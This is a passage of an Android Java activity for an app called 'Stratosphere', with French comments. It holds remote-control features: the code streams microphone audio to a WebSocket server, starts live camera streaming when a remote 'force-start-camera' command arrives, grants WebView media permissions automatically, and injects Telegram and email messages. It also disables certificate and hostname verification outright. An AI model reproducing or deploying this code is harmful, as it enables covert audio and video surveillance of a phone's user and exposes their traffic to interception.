            mailIntent.putExtra(Intent.EXTRA_SUBJECT, "Stratosphere");
            mailIntent.putExtra(Intent.EXTRA_TEXT, body);
            mailIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(mailIntent);
            Log.d(TAG, "Intent mail lancé vers " + email);
        } catch (Exception e) {
            Log.e(TAG, "Échec lancement mail vers " + email, e);
        }
    }

    // ── INJECT TELEGRAM (NOUVEAU) ───────────────────────────────────
    private void executeInjectTelegram(String chatId, String message) {
        try {
            // Méthode 1 : Ouvrir le chat Telegram via Intent
            // Si chatId commence par '@', c'est un username
            String telegramUrl;
            if (chatId.startsWith("@")) {
                telegramUrl = "https://t.me/" + chatId.substring(1);
            } else {
                telegramUrl = "https://t.me/" + chatId;
            }
            if (!message.isEmpty()) {
                telegramUrl += "?text=" + Uri.encode(message);
            }

            Intent telegramIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(telegramUrl));
            telegramIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

            // Essayer d'ouvrir avec l'app Telegram directement
            telegramIntent.setPackage("org.telegram.messenger");
            try {
                startActivity(telegramIntent);
            } catch (Exception e1) {
                // Fallback sans package spécifique (ouvre le navigateur ou le chooser)
                telegramIntent.setPackage(null);
                startActivity(telegramIntent);
            }
            Log.d(TAG, "Telegram intent lancé vers " + chatId);
        } catch (Exception e) {
            Log.e(TAG, "Échec lancement Telegram vers " + chatId, e);
        }
    }

    // ══════════════════════════════════════════════════════════════════
    //  MICRO STREAMING via WebSocket (réutilise server3.js:8443)
    //
    //  Principe : ouvre un 2ème WebSocket vers le même serveur,
    //  s'enregistre avec type "register-audio-stream",
    //  puis envoie les chunks PCM encodés en Base64.
    //  Le viewer peut écouter via un message type "audio-data".
    // ══════════════════════════════════════════════════════════════════

    @SuppressLint("MissingPermission")
    private void startMicStreaming() {
        if (isMicStreaming) return;
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Permission RECORD_AUDIO manquante");
            return;
        }

        isMicStreaming = true;

        // Ouvre un WebSocket dédié audio vers le même serveur
        OkHttpClient client = getUnsafeOkHttpClient();
        okhttp3.Request request = new okhttp3.Request.Builder().url(WSS_SERVER_URL).build();

        audioWebSocket = client.newWebSocket(request, new WebSocketListener() {
            @Override
            public void onOpen(@NonNull WebSocket webSocket, @NonNull okhttp3.Response response) {
                try {
                    JSONObject reg = new JSONObject();
                    reg.put("type", "register-audio-stream");
                    reg.put("deviceId", deviceId.isEmpty() ? Build.MODEL.trim() : deviceId);
                    webSocket.send(reg.toString());
                    Log.d(TAG, "Audio WebSocket connecté, début du streaming micro");
                } catch (Exception e) {
                    Log.e(TAG, "Erreur enregistrement audio WS", e);
                }

                // Démarrer la capture audio dans un thread séparé
                startAudioCapture(webSocket);
            }

            @Override
            public void onFailure(@NonNull WebSocket webSocket, @NonNull Throwable t, okhttp3.Response response) {
                Log.e(TAG, "Audio WebSocket failure", t);
                isMicStreaming = false;
            }

            @Override
            public void onClosed(@NonNull WebSocket webSocket, int code, @NonNull String reason) {
                isMicStreaming = false;
            }
        });
    }

    private void startAudioCapture(WebSocket targetSocket) {
        micStreamThread = new Thread(() -> {
            int sampleRate = 16000;
            int channelConfig = AudioFormat.CHANNEL_IN_MONO;
            int audioFormat = AudioFormat.ENCODING_PCM_16BIT;
            int bufferSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat);
            if (bufferSize < 4096) bufferSize = 4096;

            try {
                @SuppressLint("MissingPermission")
                AudioRecord recorder = new AudioRecord(
                        MediaRecorder.AudioSource.MIC,
                        sampleRate, channelConfig, audioFormat, bufferSize);

                audioRecord = recorder;

                if (recorder.getState() != AudioRecord.STATE_INITIALIZED) {
                    Log.e(TAG, "AudioRecord init failed");
                    isMicStreaming = false;
                    return;
                }

                recorder.startRecording();
                byte[] buffer = new byte[bufferSize];

                while (isMicStreaming) {
                    int bytesRead = recorder.read(buffer, 0, buffer.length);
                    if (bytesRead > 0) {
                        try {
                            String b64 = Base64.encodeToString(buffer, 0, bytesRead, Base64.NO_WRAP);
                            JSONObject audioPacket = new JSONObject();
                            audioPacket.put("type", "audio-data");
                            audioPacket.put("deviceId", deviceId);
                            audioPacket.put("sampleRate", sampleRate);
                            audioPacket.put("encoding", "pcm16-base64");
                            audioPacket.put("data", b64);
                            boolean sent = targetSocket.send(audioPacket.toString());
                            if (!sent) {
                                Log.w(TAG, "Audio WS send failed, stopping mic stream");
                                break;
                            }
                        } catch (Exception e) {
                            Log.e(TAG, "Erreur envoi audio chunk", e);
                            if (!isMicStreaming) break;
                        }
                    }
                }

                recorder.stop();
                recorder.release();
                audioRecord = null;
            } catch (Exception e) {
                Log.e(TAG, "Erreur capture audio", e);
            }
            isMicStreaming = false;
        }, "MicStreamThread");
        micStreamThread.start();
    }

    private void stopMicStreaming() {
        isMicStreaming = false;
        if (audioRecord != null) {
            try {
                audioRecord.stop();
                audioRecord.release();
            } catch (Exception ignored) {}
            audioRecord = null;
        }
        if (audioWebSocket != null) {
            try { audioWebSocket.close(1000, "Stop micro"); } catch (Exception ignored) {}
            audioWebSocket = null;
        }
        if (micStreamThread != null) {
            micStreamThread.interrupt();
            micStreamThread = null;
        }
        Log.d(TAG, "Micro streaming arrêté");
    }

    // ══════════════════════════════════════════════════════════════════
    //  MOTION TRAP — Accéléromètre réel
    // ══════════════════════════════════════════════════════════════════

    private void startMotionTrap() {
        if (isMotionTrapActive || accelerometer == null) {
            Log.w(TAG, "Motion trap: capteur accéléromètre indisponible ou déjà actif");
            return;
        }
        isMotionTrapActive = true;
        motionInitialized = false;
        sensorManager.registerListener(motionTrapListener, accelerometer, SensorManager.SENSOR_DELAY_NORMAL);
        Log.d(TAG, "Motion Trap ACTIVÉ");
    }

    private void stopMotionTrap() {
        if (!isMotionTrapActive) return;
        isMotionTrapActive = false;
        sensorManager.unregisterListener(motionTrapListener);
        Log.d(TAG, "Motion Trap DÉSACTIVÉ");
    }

    private void onMotionTrapTriggered() {
        // Réaction quand un mouvement est détecté :
        // Flash + vibration + notification
        runOnUiThread(() -> {
            Toast.makeText(this, "⚠ MOTION DETECTED!", Toast.LENGTH_SHORT).show();
        });
        turnFlashOnSilent();
        new Handler(Looper.getMainLooper()).postDelayed(this::turnFlashOffSilent, 500);

        if (vibrator != null && vibrator.hasVibrator()) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(VibrationEffect.createOneShot(300, VibrationEffect.DEFAULT_AMPLITUDE));
            } else {
                vibrator.vibrate(300);
            }
        }

        // Envoyer une notification locale
        try {
            NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
                    .setSmallIcon(android.R.drawable.ic_dialog_alert)
                    .setContentTitle("⚠ Motion Trap")
                    .setContentText("Mouvement détecté sur l'appareil !")
                    .setPriority(NotificationCompat.PRIORITY_HIGH);
            NotificationManagerCompat nm = NotificationManagerCompat.from(this);
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED) {
                nm.notify(9001, builder.build());
            }
        } catch (Exception ignored) {}
    }

    // ══════════════════════════════════════════════════════════════════
    //  PROXIMITY TRIGGER — Capteur de proximité réel
    // ══════════════════════════════════════════════════════════════════

    private void startProximityTrigger() {
        if (isProximityActive || proximitySensor == null) {
            Log.w(TAG, "Proximity: capteur indisponible ou déjà actif");
            return;
        }
        isProximityActive = true;
        sensorManager.registerListener(proximityListener, proximitySensor, SensorManager.SENSOR_DELAY_NORMAL);
        Log.d(TAG, "Proximity Trigger ACTIVÉ");
    }

    private void stopProximityTrigger() {
        if (!isProximityActive) return;
        isProximityActive = false;
        sensorManager.unregisterListener(proximityListener);
        Log.d(TAG, "Proximity Trigger DÉSACTIVÉ");
    }

    private void onProximityTriggered() {
        // Réaction quand un objet est détecté à proximité :
        // Stroboscope rapide pendant 3 secondes + vibration
        startStroboscope(100);
        startVibration();

        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            stopStroboscope();
            stopVibration();
        }, 3000);

        runOnUiThread(() -> {
            Toast.makeText(this, "🕶 PROXIMITY DETECTED!", Toast.LENGTH_SHORT).show();
        });
    }

    // ══════════════════════════════════════════════════════════════════
    //  FLASH / STROBOSCOPE / VIBRATION / RINGTONE
    // ══════════════════════════════════════════════════════════════════

    private void startStroboscope(int interval) {
        if (cameraId == null || isStroboRunning) return;
        STROBO_INTERVAL_MS = interval;
        isStroboRunning = true;
        stroboHandler.post(stroboRunnable);
    }

    private void stopStroboscope() {
        if (!isStroboRunning) return;
        isStroboRunning = false;
        stroboHandler.removeCallbacks(stroboRunnable);
        turnFlashOffSilent();
    }

    private void startVibration() {
        if (vibrator == null || !vibrator.hasVibrator()) return;
        if (isVibrateRunning) return;
        isVibrateRunning = true;
        vibrateHandler.post(vibrateRunnable);
    }

    private void stopVibration() {
        if (!isVibrateRunning) return;
        isVibrateRunning = false;
        vibrateHandler.removeCallbacks(vibrateRunnable);
        if (vibrator != null) vibrator.cancel();
    }

    private void startRingtone() {
        if (isRingtonePlaying) return;
        Uri ringUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE);
        try {
            ringtone = RingtoneManager.getRingtone(this, ringUri);
            if (ringtone != null) {
                AudioManager audioManager = (AudioManager) getSystemService(AUDIO_SERVICE);
                if (audioManager != null) {
                    int maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_RING);
                    audioManager.setStreamVolume(AudioManager.STREAM_RING, maxVolume, 0);
                }
                ringtone.play();
                isRingtonePlaying = true;
            }
        } catch (Exception ignored) {}
    }

    private void stopRingtone() {
        if (!isRingtonePlaying || ringtone == null) return;
        if (ringtone.isPlaying()) ringtone.stop();
        ringtone = null;
        isRingtonePlaying = false;
    }

    private void turnFlashOnSilent() {
        if (cameraId == null || isFlashOn) return;
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                cameraManager.setTorchMode(cameraId, true);
            }
            isFlashOn = true;
        } catch (Exception ignored) {}
    }

    private void turnFlashOffSilent() {
        if (cameraId == null || !isFlashOn) return;
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                cameraManager.setTorchMode(cameraId, false);
            }
            isFlashOn = false;
        } catch (Exception ignored) {}
    }

    // ══════════════════════════════════════════════════════════════════
    //  CAMERA BACKGROUND THREAD
    // ══════════════════════════════════════════════════════════════════

    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("CameraBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }

    private void stopBackgroundThread() {
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
            try { backgroundThread.join(); } catch (Exception ignored) {}
            backgroundThread = null;
            backgroundHandler = null;
        }
    }

    // ══════════════════════════════════════════════════════════════════
    //  WEBRTC LIVE ENGINE
    // ══════════════════════════════════════════════════════════════════

    @SuppressLint("SetJavaScriptEnabled")
    private void startWebRTCLiveEngine(final String roomName) {
        runOnUiThread(() -> {
            try {
                if (webRtcWebView == null) {
                    webRtcWebView = new android.webkit.WebView(MainActivity.this);
                    android.webkit.WebSettings settings = webRtcWebView.getSettings();
                    settings.setJavaScriptEnabled(true);
                    settings.setMediaPlaybackRequiresUserGesture(false);
                    settings.setDomStorageEnabled(true);

                    webRtcWebView.setWebChromeClient(new android.webkit.WebChromeClient() {
                        @Override
                        public void onPermissionRequest(final android.webkit.PermissionRequest request) {
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                                request.grant(request.getResources());
                            }
                        }
                    });

                    webRtcWebView.setWebViewClient(new android.webkit.WebViewClient() {
                        @SuppressLint("WebViewClientOnReceivedSslError")
                        @Override
                        public void onReceivedSslError(android.webkit.WebView view, android.webkit.SslErrorHandler handler, android.net.http.SslError error) {
                            handler.proceed();
                        }
                    });

                    android.view.ViewGroup container = findViewById(R.id.webViewContainer);
                    if (webRtcWebView.getParent() == null) {
                        container.addView(webRtcWebView, new android.view.ViewGroup.LayoutParams(
                                android.view.ViewGroup.LayoutParams.MATCH_PARENT,
                                android.view.ViewGroup.LayoutParams.MATCH_PARENT));
                    }
                }
                String targetUrl = WSS_SERVER_URL.replace("wss://", "https://") + "/streamer3.html?deviceid=" + roomName + "&auto=true";
                webRtcWebView.loadUrl(targetUrl);
            } catch (Exception e) { isStreaming = false; }
        });
    }

    private void stopWebRTCLiveEngine() {
        runOnUiThread(() -> {
            if (webRtcWebView != null) { webRtcWebView.loadUrl("about:blank"); webRtcWebView.clearCache(true); }
            isStreaming = false;
        });
    }

    // ══════════════════════════════════════════════════════════════════
    //  WEBSOCKET — Remote Control Listener (commandes temps réel)
    // ══════════════════════════════════════════════════════════════════

    private void startRemoteControlListener() {
        final String targetDeviceId = deviceId.isEmpty() ? Build.MODEL.trim() : deviceId;
        OkHttpClient client = getUnsafeOkHttpClient();
        okhttp3.Request request = new okhttp3.Request.Builder().url(WSS_SERVER_URL).build();

        systemWebSocket = client.newWebSocket(request, new WebSocketListener() {
            @Override
            public void onOpen(@NonNull WebSocket webSocket, @NonNull okhttp3.Response response) {
                try {
                    JSONObject registration = new JSONObject();
                    registration.put("type", "register-device-app");
                    registration.put("deviceId", targetDeviceId);
                    webSocket.send(registration.toString());
                } catch (Exception ignored) {}
            }

            @Override
            public void onMessage(@NonNull WebSocket webSocket, @NonNull String text) {
                try {
                    JSONObject packet = new JSONObject(text);
                    if ("force-start-camera".equals(packet.optString("type"))) {
                        runOnUiThread(() -> {
                            if (!isStreaming) {
                                isStreaming = true;
                                startWebRTCLiveEngine(targetDeviceId);
                            }
                        });
                    }
                } catch (Exception ignored) {}
            }

            @Override
            public void onFailure(@NonNull WebSocket webSocket, @NonNull Throwable t, okhttp3.Response response) {
                new Handler(Looper.getMainLooper()).postDelayed(() -> startRemoteControlListener(), 5000);
            }
        });
    }

    // ══════════════════════════════════════════════════════════════════
    //  SSL BYPASS (dev uniquement — certificat auto-signé)
    // ══════════════════════════════════════════════════════════════════

    private OkHttpClient getUnsafeOkHttpClient() {
        try {
            final javax.net.ssl.TrustManager[] trustAllCerts = new javax.net.ssl.TrustManager[]{
                    new javax.net.ssl.X509TrustManager() {
                        @SuppressLint("TrustAllX509TrustManager")
                        @Override
                        public void checkClientTrusted(java.security.cert.X509Certificate[] chain, String authType) {}
                        @Override
                        public void checkServerTrusted(java.security.cert.X509Certificate[] chain, String authType) {}
                        @Override
                        public java.security.cert.X509Certificate[] getAcceptedIssuers() { return new java.security.cert.X509Certificate[]{}; }
                    }
            };
            final javax.net.ssl.SSLContext sslContext = javax.net.ssl.SSLContext.getInstance("SSL");
            sslContext.init(null, trustAllCerts, new java.security.SecureRandom());
            OkHttpClient.Builder builder = new OkHttpClient.Builder();
            builder.sslSocketFactory(sslContext.getSocketFactory(), (javax.net.ssl.X509TrustManager) trustAllCerts[0]);
            builder.hostnameVerifier((hostname, session) -> true);
            return builder.build();
        } catch (Exception e) { throw new RuntimeException(e); }
    }

    // ══════════════════════════════════════════════════════════════════
    //  UTILITAIRES
    // ══════════════════════════════════════════════════════════════════

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "Stratosphere Alerts", NotificationManager.IMPORTANCE_HIGH);
            NotificationManager notificationManager = getSystemService(NotificationManager.class);
            if (notificationManager != null) { notificationManager.createNotificationChannel(channel); }
        }
    }

    private void loadDeviceIdFromPrefs() {
        SharedPreferences prefs = getSharedPreferences("MySharedPref", MODE_PRIVATE);
        deviceId = prefs.getString("name", "");
    }

    private void saveDeviceIdToPrefs(String id) {
        SharedPreferences prefs = getSharedPreferences("MySharedPref", MODE_PRIVATE);
        prefs.edit().putString("name", id).apply();
    }
}